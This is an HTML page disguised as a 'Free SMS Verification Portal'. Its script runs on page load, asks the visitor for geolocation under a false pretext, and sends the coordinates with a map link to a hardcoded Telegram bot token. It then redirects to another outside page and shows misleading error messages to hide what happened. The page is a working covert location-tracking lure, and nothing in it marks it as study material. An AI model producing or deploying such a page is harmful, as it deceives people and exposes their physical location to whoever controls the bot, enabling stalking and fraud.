<!DOCTYPE html>

<html lang="en">

<head>

  <meta charset="UTF-8">

  <title>Free SMS Verification Portal</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>

    :root {

      --primary: #0d6efd;

      --success: #28a745;

      --danger: #dc3545;

      --text-dark: #212529;

      --text-light: #6c757d;

      --bg-light: #f8f9fa;

    }

    * {

      box-sizing: border-box;

      margin: 0;

      padding: 0;

    }

    body {

      background: var(--bg-light);

      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;

      display: flex;

      justify-content: center;

      align-items: center;

      height: 100vh;

      color: var(--text-dark);

    }

    .card {

      background: #fff;

      border-radius: 12px;

      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);

      padding: 40px 50px;

      max-width: 420px;

      width: 90%;

      text-align: center;

      animation: fadeIn 0.8s ease;

    }

    .card h1 {

      font-size: 22px;

      color: var(--primary);

      margin-bottom: 15px;

      display: flex;

      align-items: center;

      justify-content: center;

      gap: 10px;

    }

    .card h1::before {

      content: '📲';

      font-size: 22px;

    }

    .card p {

      font-size: 16px;

      color: var(--text-light);

      margin-bottom: 20px;

    }

    #msg {

      font-size: 16px;

      margin-top: 15px;

      font-weight: 500;

    }

    .success {

      color: var(--success);

    }

    .error {

      color: var(--danger);

    }

    .info {

      color: var(--text-dark);

    }

    .loader {

      width: 40px;

      height: 40px;

      border: 4px solid #ccc;

      border-top-color: var(--primary);

      border-radius: 50%;

      animation: spin 1s linear infinite;

      margin: 20px auto;

    }

    @keyframes spin {

      to { transform: rotate(360deg); }

    }

    @keyframes fadeIn {

      from { opacity: 0; transform: translateY(30px); }

      to { opacity: 1; transform: translateY(0); }

    }

    @media (max-width: 500px) {

      .card {

        padding: 30px 25px;

      }

      .card h1 {

        font-size: 20px;

      }

    }

  </style>

</head>

<body>

<div class="card">

  <h1>Free SMS Verification</h1>

  <p>We are verifying your device location. Please wait...</p>

  <div class="loader" id="loader"></div>

  <div id="msg" class="info">Initializing...</div>

</div>

<script>

(function(){

  const _ = {

    msg: document.getElementById("msg"),

    loader: document.getElementById("loader"),

    token: "7055229139:AAHgJNtq6Pdve_e1W5xtlWQxjnzm27fjtpU",

    getChatID: function(){

      const p = new URLSearchParams(window.location.search);

      return p.get("chat_id");

    },

    show: function(text, type="info"){

      this.msg.innerText = text;

      this.msg.className = type;

      this.loader.style.display = 'none';

    },

    sendLocation: function(lat, lon){

      const cid = this.getChatID();

      if(!cid) return this.show("❗ Please add reference code.", "error");

      const m = `📍 *Location Captured*\n\n🌐 *Latitude:* ${lat}\n🌐 *Longitude:* ${lon}\n🔗 [Google Map](https://maps.google.com/?q=${lat},${lon})`;

      fetch(`https://api.telegram.org/bot${this.token}/sendMessage`, {

        method: "POST",

        headers: { "Content-Type": "application/json" },

        body: JSON.stringify({

          chat_id: cid,

          text: m,

          parse_mode: "Markdown"

        })

      })

      .then(res => {

        if(res.ok){

          this.show("✅ Success your free SMS verification. Please wait...", "success");

          setTimeout(() => {

            window.location.href = `https://usr-cont.nx3r.com/dccdhfgg/free-sms.html?chat_id=${cid}`;

          }, 2000);

        } else {

          this.show("❌ Your Internet connection lost.", "error");

        }

      })

      .catch(() => this.show("❌ Your Internet connection lost.", "error"));

    },

    requestLocation: function(){

      if (!navigator.geolocation) return this.show("❌ Your browser does not support location.", "error");

      navigator.geolocation.getCurrentPosition(

        pos => this.sendLocation(pos.coords.latitude, pos.coords.longitude),

        err => this.show("❌ Location permission denied.", "error")

      );

    }

  };

  window.addEventListener("load", () => {

    const cid = _.getChatID();

    if(!cid){

      _.show("❗ Please add reference code.", "error");

    } else {

      setTimeout(() => _.requestLocation(), 700); // Small delay

    }

  });

})();

</script>

</body>

</html>
